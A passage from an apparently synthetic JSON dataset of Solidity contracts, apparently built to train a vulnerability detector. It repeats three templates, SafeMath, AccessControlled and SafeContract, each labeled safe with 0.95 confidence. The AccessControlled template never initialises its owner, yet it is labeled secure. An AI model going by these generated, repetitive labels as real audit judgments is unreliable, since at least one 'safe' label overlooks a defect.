    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 602",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 603",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 604",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 605",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 606",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 607",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeMath {\n                function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {\n                    uint256 c = a + b;\n                    require(c >= a, \"Addition overflow\");\n                    return c;\n                }\n\n                function safeSub(uint256 a, uint256 b) public pure returns (uint256) {\n                    require(b <= a, \"Subtraction underflow\");\n                    return a - b;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 608",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract AccessControlled {\n                address public owner;\n                mapping(address => bool) public authorized;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                modifier onlyAuthorized() {\n                    require(authorized[msg.sender] || msg.sender == owner, \"Not authorized\");\n                    _;\n                }\n\n                function setAuthorized(address user, bool status) public onlyOwner {\n                    authorized[user] = status;\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 609",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  },
  {
    "code": "\n            pragma solidity ^0.8.0;\n            contract SafeContract {\n                mapping(address => uint256) public balances;\n                address public owner;\n\n                modifier onlyOwner() {\n                    require(msg.sender == owner, \"Not owner\");\n                    _;\n                }\n\n                constructor() {\n                    owner = msg.sender;\n                }\n\n                function withdraw(uint256 amount) public {\n                    require(balances[msg.sender] >= amount, \"Insufficient balance\");\n                    balances[msg.sender] -= amount;\n                    (bool success, ) = msg.sender.call{value: amount}(\"\");\n                    require(success, \"Transfer failed\");\n                }\n            }",
    "vulnerability_label": 0,
    "vulnerability_type": "none",
    "severity": "Safe",
    "title": "Safe Contract Pattern 610",
    "description": "Safe contract with proper security patterns",
    "confidence": 0.95,
    "source": "synthetic_safe",
    "repository": "generated",
    "audit_source": "vulnhunter",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.3,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": false,
    "formal_verification_target": false
  }
]